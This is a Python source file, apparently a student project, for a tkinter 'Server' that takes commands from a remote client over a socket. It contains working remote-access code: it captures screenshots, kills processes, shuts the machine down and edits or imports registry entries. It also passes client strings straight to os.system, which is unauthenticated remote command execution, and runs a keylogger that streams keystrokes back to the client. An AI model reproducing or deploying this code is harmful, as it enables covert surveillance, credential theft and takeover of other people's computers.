from tkinter import ttk
from tkinter import *
import threading
import socket
import os
import pyautogui
import registry
from winreg import *
from time import sleep
import subprocess
import keyboard #pip install keyboard
import re

mp={
    'HKEY_CLASSES_ROOT':HKEY_CLASSES_ROOT,
    'HKEY_CURRENT_CONFIG':HKEY_CURRENT_CONFIG,
    'HKEY_CURRENT_USER':HKEY_CURRENT_USER,
    'HKEY_USERS':HKEY_USERS,
    'HKEY_LOCAL_MACHINE':HKEY_LOCAL_MACHINE
}
class Server(object):
    def threadConnect(self):
        con=threading.Thread(target=self.Connect)
        con.start()
    def Connect(self):
        port = 1025
        addr = socket.gethostbyname(socket.gethostname())
        Label(self.mainframe,text=addr+':'+str(port)).grid(column=1,row=2)
        print(addr, port)
        self.connectButton['text'] = 'Close'
        self.connectButton['command'] = self.Close
        global s
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
        s.bind((addr, port))
        s.listen()
        while True:
            self.conn, self.target_addr = s.accept()
            data=self.conn.recv(1024)
            print(data)
            if not data:
                break
            self.magicFunction(data)
    def main_form(self):
        """Creates the interface window"""
        self.root = Tk()
        self.root.title("Server")

        #mainframe
        self.mainframe = ttk.Frame(self.root, padding="25 25 50 50")
        self.mainframe.grid(column=0, row=0, sticky=(N,W,E,S))
        self.root.columnconfigure(0, weight=1)
        self.root.rowconfigure(0, weight=1)
        self.root.resizable(FALSE, FALSE)

        #Open server button
        self.connectButton = ttk.Button(self.mainframe, text='Open', command=self.threadConnect)
        self.connectButton.grid(column=1, row=1)
        self.root.mainloop()
        try:
            self.conn.close()#Dong ket noi socket
        except:
            pass
    
    #Ham nay nhan lenh tu client
    def magicFunction(self,Str):
        if Str.decode()=='Hello':
            print('Hello')
        elif Str.decode().find('SHUTDOWN')!=-1:
            #Commands the server to shut down
            try:
                a = Str.decode().split()
                cmd = Str.decode()
                if len(a) == 2:
                    cmd='shutdown -s -t ' + a[1]
                else:
                    cmd='shutdown -s'
                os.system(cmd)
            except Exception as e:
                self.conn.send("Invalid command: " + str(e))
        elif Str.decode() == 'CAPSCR':
            try:
                pyautogui.screenshot().save('bKneabBdp53zAl7zOF5t.png')
                send = open('bKneabBdp53zAl7zOF5t.png','rb')
                data=send.read()
                self.conn.sendall(data)
                send.close()
            except:
                pass        
        elif Str.decode() == 'SHWPRC':
            #Commands the server to send the file consisting of running processes
            tmp=subprocess.check_output('wmic process get Name, ProcessId, ThreadCount')
            arr=[]
            csv_str=''
            for p in tmp.split()[3:]:
                if len(arr)!=0 and re.search('[a-zA-Z]',arr[-1]) and re.search('[a-zA-Z]',str(p.decode())):
                    arr[-1]=arr[-1]+str(p.decode())
                else:
                    arr.append(str(p.decode()))
            for i in range(0,len(arr),1):
                if i==len(arr)-1:
                    csv_str+=arr[i]
                csv_str+=arr[i]+','
            self.conn.sendall(csv_str.encode())
            self.conn.send('STOPRIGHTNOW'.encode())
        elif Str.decode() == 'SHWPRCAPP':
            tmp = subprocess.check_output("powershell gps | where {$_.MainWindowTitle} | select Name,Id,@{Name='ThreadCount';Expression={$_.Threads.Count}}")
            arr = tmp.split()[6:]
            csv_str=''
            for i in range(0,len(arr),1):
                if i==len(arr)-1:
                    csv_str+=str(arr[i].decode())
                csv_str+=str(arr[i].decode())+','
            self.conn.sendall(csv_str.encode())
            self.conn.send('STOPRIGHTNOW'.encode())
        elif Str.decode().find('GETVALUE')!=-1:
            try:
                arr = Str.decode().split('%')
                brr = arr[1].split('\\',1)
                self.conn.send(str(registry.getValue(mp[brr[0]],brr[1],arr[2])).encode())
            except:
                self.conn.send('Failed'.encode())
        elif Str.decode().find('SETVALUE')!=-1:
            try:
                arr = Str.decode().split('%')
                brr = arr[1].split('\\',1)
                if registry.setValue(mp[brr[0]],brr[1],arr[2],arr[3],arr[4]) == True:
                    self.conn.send('Completed'.encode())
                else:
                    self.conn.send('Failed'.encode())
            except:
                self.conn.send('Failed'.encode())
        elif Str.decode().find('DELETEVALUE')!=-1:
            try:
                arr = Str.decode().split('%')
                brr = arr[1].split('\\',1)
                if registry.deleteValue(mp[brr[0]],brr[1],arr[2]):
                    self.conn.send('Completed'.encode())
                else:
                    self.conn.send('Failed'.encode())
            except:
                self.conn.send('Failed'.encode())
        elif Str.decode().find('CREATEKEY')!=-1:
            try:
                arr = Str.decode().split('%')
                if registry.createKey(arr[1])==True:
                    self.conn.send('Completed'.encode())
                else:
                    self.conn.send('Failed'.encode())
            except:
                self.conn.send('Failed'.encode())
        elif Str.decode().find('DELETEKEY')!=-1:
            try:
                arr = Str.decode().split('%')
                if registry.deleteKey(arr[1])==True:
                    self.conn.send('Completed'.encode())
                else:
                    self.conn.send('Failed'.encode())
            except:
                self.conn.send('Failed'.encode())
        elif Str.decode().find('KILLAPP') != -1:
            name = str(Str.decode().split()[1])
            try:
                subprocess.check_output('powershell Stop-Process -ID '+ name +' -Force')            
                self.conn.send('TRUE'.encode())
            except:
                self.conn.send('FALSE'.encode())
                pass
        elif Str.decode().find('KILL') != -1:
            try:
                PID = int(Str.decode().split()[1])
                os.kill(PID, 9)
                self.conn.send('TRUE'.encode())
            except:
                self.conn.send('FALSE'.encode())
                pass
        elif Str.decode().find('START') != -1:
            try:
                os.system(Str.decode())
                self.conn.send('TRUE'.encode())
            except:
                self.conn.send('FALSE'.encode())
                pass
        elif Str.decode() == 'KEYLOG':
            bep = threading.Thread(target=self.startKeylogging)
            bep.start()
        elif Str.decode() == 'KEYSTOP':
            self.stopKeylogging()
        else:
            try:
                f_bin=open(r'AOF0EcaC3IaVlnR9XMOw.reg','wb+')
                f_bin.write(Str)
                f_bin.close()
                if len(Str)<1024:
                    try:
                        registry.importRegistry(filepath=r'AOF0EcaC3IaVlnR9XMOw.reg')
                        self.conn.send('Completed'.encode())
                    except:
                        self.conn.send('Failed'.encode())
            except:
                print('Goodbye')

    #ATTRIBUTES AND METHODS SPECIFICALLY FOR KEYLOGGING:
    __interval = 5
    __log = ''
    __noch = 0
    def __callback(self, event):
        name = event.name
        if len(name) > 1:
                if name == 'space':
                    name = ' '
                elif name == 'enter':
                    name = '[ENTER]\n'
                elif name == 'decimal':
                    name = '.'
                else:
                    name = name.replace(" ", "_")
                    name = f"[{name.upper()}]"
        self.__log += name
    def __report(self):
        if self.__log:
            self.conn.send(self.__log[self.__noch:].encode())
            self.__noch = len(self.__log)
        timer = threading.Timer(interval=self.__interval, function=self.__report)
        timer.daemon = True
        timer.start()
    def startKeylogging(self):
        keyboard.on_release(self.__callback)
        self.__report()
        keyboard.wait()
    #TODO: Unhook
    def stopKeylogging(self):
        try:
            keyboard.unhook(self.__callback)
        except:
            print('Unhook')
    def Close(self):
        s.close()
        close_it=threading.Thread(target=self.root.destroy,daemon=True)
        close_it.start()
ins=Server()
mainz=threading.Thread(target=ins.main_form)
try:
    mainz.start()
except:
    pass
